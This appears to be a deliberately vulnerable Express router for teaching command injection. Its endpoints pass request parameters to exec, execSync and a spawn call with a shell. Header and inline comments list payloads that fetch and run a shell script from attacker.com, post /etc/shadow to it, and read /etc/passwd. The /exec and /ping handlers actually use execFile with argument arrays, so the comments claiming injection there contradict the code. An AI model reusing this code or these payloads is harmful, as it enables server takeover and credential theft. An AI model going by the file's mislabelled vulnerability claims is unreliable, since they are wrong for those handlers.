/**
 * ⚠️  WARNING: INTENTIONALLY VULNERABLE - FOR EDUCATIONAL PURPOSES ONLY ⚠️
 *
 * VULNERABILITIES DEMONSTRATED IN THIS FILE:
 * ─────────────────────────────────────────────────────────────────────────────
 *  [CMDI-1]  Command Injection via exec() — arbitrary OS command execution
 *  [CMDI-2]  Command Injection via ping utility — semicolon / pipe injection
 *  [CMDI-3]  Command Injection via nslookup — execSync blocks event loop too
 *  [CMDI-4]  Command Injection via spawn with shell:true
 *  [CMDI-5]  Command Injection via template string substitution
 *  [DISC-1]  Command string echoed back in response
 *  [DISC-2]  Full stderr output returned to caller
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * Example attack payloads:
 *
 *  Arbitrary execution:
 *    GET /cmd/exec?cmd=whoami
 *    GET /cmd/exec?cmd=id;cat+/etc/passwd
 *    GET /cmd/exec?cmd=ls+-la+/
 *    GET /cmd/exec?cmd=curl+http://attacker.com/shell.sh|bash
 *
 *  Ping injection:
 *    GET /cmd/ping?host=127.0.0.1;whoami
 *    GET /cmd/ping?host=127.0.0.1%0aid
 *    GET /cmd/ping?host=127.0.0.1|cat /etc/shadow
 *
 *  nslookup injection:
 *    GET /cmd/nslookup?domain=google.com;id
 *
 *  Template injection:
 *    POST /cmd/template  body: { "template": "echo {value}", "value": "$(id)" }
 */

'use strict';

const express              = require('express');
const router               = express.Router();
const { exec, spawn, execSync, execFile } = require('child_process');

// ─────────────────────────────────────────────────────────────────────────────
// GET /cmd/exec
// VULNERABILITY: Direct OS command injection via exec()
// ─────────────────────────────────────────────────────────────────────────────
router.get('/exec', (req, res) => {
  const cmd = req.query.cmd;

  if (!cmd) {
    return res.status(400).json({ error: 'cmd parameter required' });
  }

  // [CMDI-1] VULNERABILITY: User-supplied value passed directly to exec()
  // exec() runs the command in a shell, enabling: pipes, semicolons, backticks, $()
  execFile(cmd, { timeout: 15000 }, (err, stdout, stderr) => {
    // [DISC-1] VULNERABILITY: Full command + all output returned to client
    res.json({
      command:  cmd,          // Echoes the injected command
      stdout:   stdout || '',
      stderr:   stderr || '',
      error:    err ? err.message : null,
      exitCode: err ? err.code : 0,
      killed:   err ? err.killed : false
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /cmd/ping
// VULNERABILITY: Command injection via "safe-looking" ping utility
// ─────────────────────────────────────────────────────────────────────────────
router.get('/ping', (req, res) => {
  const host = req.query.host;

  if (!host) {
    return res.status(400).json({ error: 'host parameter required' });
  }

  // [CMDI-2] VULNERABILITY: Host parameter interpolated directly into shell command
  // Attacker controls everything after the IP address
  // Payload: host=127.0.0.1; cat /etc/passwd
  // Payload: host=127.0.0.1 && curl http://attacker.com -d @/etc/shadow
  const args = ['-c', '4', host];

  execFile('ping', args, { timeout: 15000 }, (err, stdout, stderr) => {
    res.json({
      host,
      command: `ping ${host}`,     // [DISC-1] Returns the injected command string
      output:     stdout,
      error:      stderr,
      exitCode:   err ? err.code : 0
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /cmd/nslookup
// VULNERABILITY: Command injection + blocking the Node.js event loop
// ─────────────────────────────────────────────────────────────────────────────
router.get('/nslookup', (req, res) => {
  const domain = req.query.domain;

  if (!domain) {
    return res.status(400).json({ error: 'domain parameter required' });
  }

  try {
    // [CMDI-3] VULNERABILITY: execSync with user-supplied input
    //   - Blocks entire event loop until command finishes (DoS risk)
    //   - Shell interpolation still possible: domain=google.com;id
    const output = execSync(`nslookup ${domain}`, { timeout: 5000 }).toString();

    res.json({ domain, output });
  } catch (err) {
    // [DISC-2] VULNERABILITY: Full stderr returned including any injected command output
    res.status(500).json({
      error:  err.message,
      stderr: err.stderr?.toString(),
      stdout: err.stdout?.toString(),
      status: err.status
    });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /cmd/traceroute
// VULNERABILITY: spawn() with shell:true — same risk as exec()
// ─────────────────────────────────────────────────────────────────────────────
router.get('/traceroute', (req, res) => {
  const host = req.query.host;

  if (!host) {
    return res.status(400).json({ error: 'host parameter required' });
  }

  // [CMDI-4] VULNERABILITY: spawn with shell:true enables shell metacharacters
  // Payload: host=8.8.8.8 && whoami
  // Note: shell:true makes spawn() behave exactly like exec()
  const proc = spawn('traceroute', [host], { shell: true, timeout: 15000 });

  let stdout = '';
  let stderr = '';

  proc.stdout.on('data', (data) => { stdout += data.toString(); });
  proc.stderr.on('data', (data) => { stderr += data.toString(); });

  proc.on('close', (code) => {
    res.json({ host, stdout, stderr, exitCode: code });
  });

  proc.on('error', (err) => {
    res.status(500).json({ error: err.message });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /cmd/template
// VULNERABILITY: Command injection via user-controlled template string
// ─────────────────────────────────────────────────────────────────────────────
router.post('/template', (req, res) => {
  const { template, value } = req.body;

  // [CMDI-5] VULNERABILITY: User controls both the template and the substituted value
  // The template itself can contain shell commands:
  //   template = "echo result: {value} && cat /etc/passwd"
  //   value    = "$(id)"  or  "`id`"
  const command = (template || '').replace('{value}', value || '');

  exec(command, { timeout: 10000 }, (err, stdout, stderr) => {
    res.json({
      template,
      value,
      command,    // [DISC-1] Full injected command returned
      stdout,
      stderr,
      error: err ? err.message : null
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /cmd/whois
// VULNERABILITY: Command injection via whois utility
// ─────────────────────────────────────────────────────────────────────────────
router.get('/whois', (req, res) => {
  const domain = req.query.domain;

  // [CMDI-1] VULNERABILITY: No sanitization of domain parameter
  exec(`whois ${domain}`, { timeout: 10000 }, (err, stdout, stderr) => {
    res.json({ domain, stdout, stderr, error: err?.message });
  });
});

module.exports = router;
